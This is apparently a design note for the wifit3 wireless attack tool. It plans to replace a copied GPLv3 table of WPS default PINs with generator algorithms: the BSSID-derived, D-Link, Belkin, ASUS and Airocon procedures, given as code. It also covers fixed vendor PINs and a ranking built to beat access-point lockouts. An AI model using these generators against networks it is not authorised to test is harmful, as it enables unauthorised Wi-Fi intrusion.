# WPS OUI / Default-PIN — algorithmic replacement for `known_pins.json`

**Status:** RESEARCH / PLAN (not yet implemented). Captured 2026-07-11.
**Why this doc exists:** the shipped `src/wifit3/engine/attacks/wps/known_pins.json` (534 OUIs)
was copied from **airgeddon**'s `known_pins.db`, which is **GPLv3**. Wifit3 is **GPLv2**
(incompatible), and copying the whole curated compilation risks a "thin" compilation copyright
in its *selection/arrangement*. Decision: **replace the copied table with runtime PIN
*algorithms*** (pure procedures/math — uncopyrightable), keep a small dict of widely-published
fixed defaults, and **credit airgeddon as a provenance/update pointer only** (no data copied).

**Hard design constraint (from hardware):** some APs **hard-lock after ~3 attempts** until reboot.
So candidate *ordering* matters more than breadth — we must try the **single most-likely PIN
first**. That makes the **OUI → [ranked algos]** dispatch table the chosen design (not "run all
generators in arbitrary order"). The generators still generalize beyond any OUI list; the table
just ranks which to try first for a given OUI.

**Not doing yet:** implementation is a dedicated future session (involved; preserve context for
the HW TX-ACK work first). Belkin is deferred (needs the AP serial, which only arrives in M1 —
after the campaign has already picked its guess).

---

## 0. Bottom line

Every WPS default-PIN *generation algorithm* worth shipping is a pure arithmetic/bitwise procedure
(uncopyrightable — 17 U.S.C. §102(b): "no… procedure, process, system, method of operation") and
each is documented in at least one non-GPLv3 source. Replace airgeddon's 534-OUI compilation with:

1. a set of pure-function generators (BSSID-derived + Belkin, which needs the WPS serial),
2. a small dict of ~22 **fixed static-constant** default PINs (Cisco/Broadcom/Realtek/Thomson/…),
   widely published and corroborated across ≥3 independent sources, and
3. an **OUI → ranked-algorithm dispatch** so the most-likely PIN is tried first (lockout budget).

Public seam stays `known_pins.known_pins_for(bssid) -> list[str]` (called at `campaign.py:154`);
checksum already exists as `wsc_crypto.pin_checksum` (`wsc_crypto.py:353`) and `pin_is_valid`
(`:365`) — reuse them. Drop-in swap: change the *source* of candidates from JSON to generators.

---

## 1. The WPS checksum digit (everything depends on it)

An 8-digit WPS PIN is 7 payload digits + 1 check digit. From the Wi-Fi Simple Config / WPS spec
(reference: hostapd `wps_pin_checksum`, BSD): given the 7-digit integer `pin`:

```
accum = 0
while pin:
    accum += 3 * (pin % 10)
    pin  //= 10
    accum += pin % 10
    pin  //= 10
check = (10 - accum % 10) % 10
```

- Sanity vector: `checksum(1234567) == 0` → spec example PIN `12345670`. ✔
- Assembly wrapper used by every generator below:
  `raw → seven = raw % 10_000_000 → full = f"{seven:07d}{checksum(seven)}"`
  (the `:07d` zero-pad matters — PINs can start with 0, e.g. `05294176`).
- **`wsc_crypto.pin_checksum(pin_7digit: int) -> int` in the repo is exactly this — reuse it.**

Sources: hostapd `src/wps` (BSD) <https://w1.fi/cgit/hostap/tree/src/wps>;
Viehböck, "Brute forcing Wi-Fi Protected Setup" (2011)
<https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf>.

---

## 2. The algorithms (precise enough to implement directly)

Notation: `mac` = BSSID as 48-bit int (`int(bssid_hex, 16)`); `b = [b0..b5]` = the 6 octets;
`nic = mac & 0xFFFFFF`; `oui = mac >> 24`. Each returns a raw int → feed through the
`% 10_000_000 + checksum` wrapper from §1. Examples use synthetic MAC `00:11:22:33:44:55`.

### 2.1 ComputePIN / "24-bit" (Broadcom-style default) — `pin24`
- Input: BSSID only. `raw = mac & 0xFFFFFF`.
- Example → `33598291`.
- Applies to: the single largest family (~130 OUIs: Broadcom/Atheros/Ralink — Belkin, Sitecom,
  Netgear, TP-Link, Zyxel, D-Link, Huawei HG…).
- Provenance: "ComputePIN" (zhaochunsheng); clean re-impl in **bertof/WPS-pin-generator
  (Apache-2.0)** <https://github.com/bertof/WPS-pin-generator>. **Clean.**

### 2.2 N-bit BSSID variants — `pin28 / pin32 / pin36 / pin40 / pin44 / pin48`
Same idea, wider slice before mod-10⁷:

| Algo | raw = | width |
|---|---|---|
| pin28 | `mac & 0xFFFFFFF` | low 28 bits |
| pin32 | `mac % 0x100000000` | low 32 bits |
| pin36 | `mac % 0x1000000000` | low 36 bits |
| pin40 | `mac % 0x10000000000` | low 40 bits |
| pin44 | `mac % 0x100000000000` | low 44 bits |
| pin48 | `mac` | all 48 bits |

- Examples: pin28→`69142611`, pin32→`37851736`, pin36→`87524697`, pin40/44/48→`82292058`.
- Provenance: 3WiFi <https://3wifi.stascorp.com/wpspin>; drygdryg `wpspin`. Trivial procedure. **Clean.**

### 2.3 D-Link — `pinDLink` and `pinDLink1`
```
nic = mac & 0xFFFFFF
pin = nic ^ 0x55AA55
pin ^= ((pin & 0x0F) << 4) + ((pin & 0x0F) << 8) + ((pin & 0x0F) << 12) \
     + ((pin & 0x0F) << 16) + ((pin & 0x0F) << 20)
pin %= 10_000_000
if pin < 1_000_000:                    # force 7 digits, no leading zero
    pin += (pin % 9) * 1_000_000 + 1_000_000
raw = pin
```
- `pinDLink1` = identical but computed on `mac + 1` (WPS radio BSSID often label-MAC + 1).
- Examples: pinDLink→`67456000`, pinDLink1→`56271874`.
- Provenance: **Heffner/devttys0, "Reverse Engineering the D-Link WPS Pin Algorithm" (2014)** —
  independent public writeup <https://hackaday.com/2014/10/31/reverse-engineering-the-d-link-wps-pin-algorithm/>.
  Implement from the prose (repo `devttys0/wps` has no explicit license — do not paste). **Clean.**

### 2.4 Belkin — `belkin` (needs the serial number) — DEFERRED
Input: BSSID + serial (serial is in the WPS IE / M1 device attributes). Uses only the last 4 MAC
nibbles + last 4 serial digits. `sn[0..3]` = last-4 serial chars (hex value) LSB-first,
`nic[0..3]` = last-4 MAC nibbles LSB-first:
```
k1 = (sn[2] + sn[3] + nic[0] + nic[1]) % 16
k2 = (sn[0] + sn[1] + nic[3] + nic[2]) % 16
pin = k1 ^ sn[1]
t1  = k1 ^ sn[0]
t2  = k2 ^ nic[1]
p1  = nic[0] ^ sn[1] ^ t1
p2  = k2 ^ nic[0] ^ t2
p3  = k1 ^ sn[2] ^ k2 ^ nic[2]
k1  = k1 ^ k2
pin = (pin ^ k1)*16;  pin = (pin + t1)*16;  pin = (pin + p1)*16
pin = (pin + t2)*16;  pin = (pin + p2)*16;  pin = (pin + k1)*16;  pin += p3
pin = (pin % 10_000_000) - ((pin % 10_000_000) // 10_000_000) * k1
raw = pin
```
- Applies to: Arcadyan-built Belkin F9K/F7D/F6D/F5D.
- Provenance: **Heffner/devttys0, "Reversing Belkin's WPS Pin Algorithm" (2015)** — independent
  writeup. **Clean via the writeup.** **Deferred** in wifit3 because the serial only arrives in M1,
  after the campaign has chosen its guess — needs an exchange-flow change.

### 2.5 ASUS — `pinASUS`
```
pin = ""
for i in range(7):
    pin += str( (b[i % 6] + b[5]) % (10 - (i + b[1]+b[2]+b[3]+b[4]+b[5]) % 7) )
raw = int(pin)
```
- Example → `10403853`. Applies to ~90 ASUS OUIs.
- Provenance: 3WiFi; miloserdov.org; kalitut (independent). **Clean.**

### 2.6 Airocon Realtek — `pinAirocon`
```
raw = ((b0+b1)%10)
    + ((b5+b0)%10)*10
    + ((b4+b5)%10)*100
    + ((b3+b4)%10)*1000
    + ((b2+b3)%10)*10000
    + ((b1+b2)%10)*100000
    + ((b0+b1)%10)*1000000
```
- Example → `71593579`. Applies to Realtek/Airocon OUIs.
- Provenance: 3WiFi / miloserdov / kalitut. **Clean.**

### 2.7 Static / inverted MAC variants (low-yield, cheap)
```
pinInvNIC    : raw = ~nic & 0xFFFFFF
pinNIC2      : raw = nic * 2
pinNIC3      : raw = nic * 3
pinOUIaddNIC : raw = (oui + nic) % 10_000_000
pinOUIsubNIC : raw = oui - nic          (mod 0x1000000 if nic > oui)
pinOUIxorNIC : raw = oui ^ nic
```
Provenance: drygdryg `wpspin` / 3WiFi. Uncopyrightable. **Clean.** Optional (cheap extra candidates).

### 2.8 Fixed static-constant defaults (same PIN for the whole family)
Single constants (not BSSID-derived), widely published + cross-corroborated. 8-digit forms:

| Family | PIN | | Family | PIN |
|---|---|---|---|---|
| Cisco | `12345670` | | Realtek 1 | `95661469` |
| Broadcom 1 | `20172527` | | Realtek 2 | `95719115` |
| Broadcom 2 | `46264848` | | Realtek 3 | `48563710` |
| Broadcom 3 | `76229909` | | Upvel | `20854836` |
| Broadcom 4 | `62327145` | | UR-814AC | `43977680` |
| Broadcom 5 | `10864111` | | UR-825AC | `05294176` |
| Broadcom 6 | `31957199` | | Onlime | `99956042` |
| Airocon 1 | `30432031` | | Edimax | `35611530` |
| Airocon 2 | `71412252` | | Thomson | `67958146` |
| DSL-2740R | `68175542` | | Huawei HG532x | `34259283` |
| | | | H108L | `94229882` |
| | | | CBN/ONO | `95755212` |

Provenance: appear identically in 3WiFi, OneShot, wpspin, miloserdov, kalitut, vendor forums. **Clean.**

### 2.9 No public algorithm — Arris, most TrendNet, most Zyxel
- **Arris (DG860/TG862/…):** per-device label PIN, **no published derivation** → omit (low yield).
- **TrendNet:** mostly Realtek/Ralink/Broadcom silicon → already covered by pin24/Realtek/Airocon.
- **Zyxel/Keenetic:** mix of label-random + a few statics (Onlime/Huawei-HG) → covered by §2.8.

---

## 3. Provenance & license summary

| Algorithm | Independent (non-GPLv3) source | License | Clean? |
|---|---|---|---|
| WPS checksum | WSC spec; hostapd; Viehböck 2011 | BSD / academic | ✅ (in repo) |
| ComputePIN / pin24 | bertof/WPS-pin-generator | Apache-2.0 | ✅ |
| pin28…48 | 3WiFi; miloserdov; kalitut | web writeups | ✅ |
| D-Link (+1) | Heffner/devttys0 (2014) | public writeup | ✅ (from prose) |
| Belkin | Heffner/devttys0 (2015) | public writeup | ✅ (from prose) |
| ASUS | 3WiFi; miloserdov; kalitut | web writeups | ✅ |
| Airocon | 3WiFi; miloserdov; kalitut | web writeups | ✅ |
| inverted/NIC/OUI variants | 3WiFi / wpspin | procedure | ✅ |
| Static constants (§2.8) | 3WiFi, wpspin, miloserdov, kalitut, forums | multi-source facts | ✅ |

**GPL-only algorithms: none.** GPL projects here (airgeddon GPLv3 = the *compilation* we're
replacing; OneShot GPLv3; bully GPLv3; pixiewps GPLv3+ = a *different* attack; reaver-wps-fork-t6x
GPLv2 = brute-forcer, no generators) all either ship only data or implement algorithms that are
*also* independently described. **Rule: cite the independent source in each generator's docstring;
implement from it, not from OneShot/airgeddon.**

---

## 4. Coverage tradeoff (computed vs the actual 534-OUI `known_pins.json`, 1,807 pairs)

- **166/534 OUIs (31%)** recognized by a published generator (137 MAC-derived, 44 static-family, overlap).
- **68/534 (13%)** are purely generic PINs (`12345670`, `00000000`, …) — already in `COMMON_PINS`; redundant.
- **107/534 (20%)** contain a known static-constant vendor PIN — covered by §2.8.
- **368/534 (69%)** not in OneShot's dispatch — airgeddon's "observed on a specific device" records;
  many are still algorithm-reproducible from the *full* BSSID (the JSON only stores the OUI, so it
  can't dispatch — but pin24/DLink/etc. would regenerate them). Residue = genuine label-random one-offs.

**Interpretation:** generators cover the *entire family* (any BSSID, not just logged OUIs) and thus
strictly dominate the static list on recall for algorithmic families, at the cost of ~8–20 candidate
PINs/AP. The 534-entry JSON is ~80–90% redundant with generators + §2.8 + `COMMON_PINS`; the
non-redundant remainder is low-value one-offs. **With the ~3-attempt lockout budget, ranking beats
breadth** — hence the ordering table.

---

## 5. Recommended module design

Keep the public seam so `campaign.py` is untouched. Delete `known_pins.json`. Stdlib only (no numpy).

```
src/wifit3/engine/attacks/wps/
  known_pins.py   # public: known_pins_for(bssid[, serial]) -> list[str]  (KEEP name)
  wps_algos.py    # NEW: pure generators + STATIC_PINS + OUI dispatch (or fold into known_pins.py)
  wsc_crypto.py   # UNCHANGED — reuse pin_checksum()
  pins.py         # UNCHANGED — COMMON_PINS stays the generic fallback
```

Generators are pure functions returning the finished 8-digit string via a shared finalizer:

```python
from .wsc_crypto import pin_checksum

def _finalize(raw: int) -> str:
    seven = raw % 10_000_000
    return f"{seven:07d}{pin_checksum(seven)}"

def pin24(bssid: bytes) -> list[str]:
    return [_finalize(int.from_bytes(bssid, "big") & 0xFFFFFF)]
# pin28…48, pinDLink, pinDLink1, pinASUS, pinAirocon, inv/NIC/OUI ... each -> list[str]

def belkin(bssid: bytes, serial: str) -> list[str]:   # DEFERRED (needs M1 serial)
    ...
```

**STATIC_PINS** = plain dict (individually well-known facts, no compilation risk).

**Dispatch — ranked, our-own OUI→algo table (the chosen design):**
```python
def known_pins_for(bssid: str, serial: str | None = None) -> list[str]:
    raw = bytes.fromhex("".join(c for c in bssid if c in "0123456789abcdefABCDEF")[:12])
    oui = raw[:3].hex().upper()
    out: list[str] = []
    for algo in _ALGOS_FOR_OUI.get(oui, _DEFAULT_ALGOS):   # most-likely first (lockout budget)
        out += algo(raw)
    out += STATIC_PINS.values()
    return list(dict.fromkeys(out))      # order-preserving dedup
```
- `_ALGOS_FOR_OUI` is a **small, our-own** OUI→[ranked generators] table. Source the OUI→vendor→algo
  membership from the **public IEEE OUI registry** (vendor name → likely algo), NOT by copying
  airgeddon/OneShot's mask lists. That keeps even the ranking table clean.
- `_DEFAULT_ALGOS` (for unknown OUIs) = the BSSID-only generators in a sane default order.

**Attribution docstring** (credit airgeddon without copying its data):
```
WPS default-PIN candidate generation. PINs are computed at runtime from published WPS
default-PIN *algorithms* (procedures/math, not copyrightable): 24-bit "ComputePIN" and its
N-bit BSSID variants, D-Link (Heffner/devttys0 2014), Belkin (Heffner/devttys0 2015), ASUS,
Airocon, plus widely-published fixed static defaults. Checksum per the Wi-Fi Simple Config
spec (wsc_crypto.pin_checksum). Reference implementations consulted (algorithm descriptions
only, no code copied): bertof/WPS-pin-generator (Apache-2.0); devttys0 write-ups; 3WiFi
(3wifi.stascorp.com/wpspin). For a maintained *observed*-PIN compilation to sanity-check
coverage or mine new fixed defaults, see airgeddon's known_pins.db
(github.com/v1s1t0r1sh3r3/airgeddon, GPLv3) — used only as a provenance/update pointer;
none of its data is copied here.
```

**Migration:** (1) add generators + STATIC_PINS + finalizer; (2) rewrite `known_pins_for` to
generate (ranked); (3) delete `known_pins.json` + its lru_cache JSON loader; (4) later: thread the
WPS `serial` from the enrollee/registrar path so Belkin can fire; (5) unit tests on the §2 vectors
(`pin24(00:11:22:33:44:55)=="33598291"`, `pinDLink=="67456000"`, Cisco `12345670`) + assert every
emitted PIN passes `pin_is_valid`.

---

## Sources
- WSC checksum / hostapd `wps_pin_checksum` (BSD): <https://w1.fi/cgit/hostap/tree/src/wps>
- Viehböck 2011: <https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf>
- bertof/WPS-pin-generator (Apache-2.0; ComputePIN): <https://github.com/bertof/WPS-pin-generator>
- Heffner/devttys0 — D-Link (2014): <https://hackaday.com/2014/10/31/reverse-engineering-the-d-link-wps-pin-algorithm/>
- Heffner/devttys0 — Belkin (2015): coverage <https://securityaffairs.com/35985/hacking/hacking-belkin-wps-pin.html>
- 3WiFi WPS PIN generator: <https://3wifi.stascorp.com/wpspin>
- drygdryg `wpspin`: <https://github.com/drygdryg/wpspin> ; OneShot (GPLv3, reference only): <https://github.com/kimocoder/OneShot>
- Write-ups: <https://miloserdov.org/?p=325> , <https://kalitut.com/effective-selection-of-wps-pins-based/>
- airgeddon (GPLv3, compilation being replaced): <https://github.com/v1s1t0r1sh3r3/airgeddon>
- GPL context: bully <https://github.com/aanarchyy/bully> ; pixiewps <https://github.com/wiire-a/pixiewps> ; reaver-wps-fork-t6x (GPLv2) <https://github.com/t6x/reaver-wps-fork-t6x>

**Repo touch-points:** `known_pins.py` (rewrite), `known_pins.json` (delete), `pins.py`
(`COMMON_PINS`, keep), `wsc_crypto.py` (`pin_checksum`/`pin_is_valid`, reuse), `campaign.py:154`
(the `known_pins_for` seam).
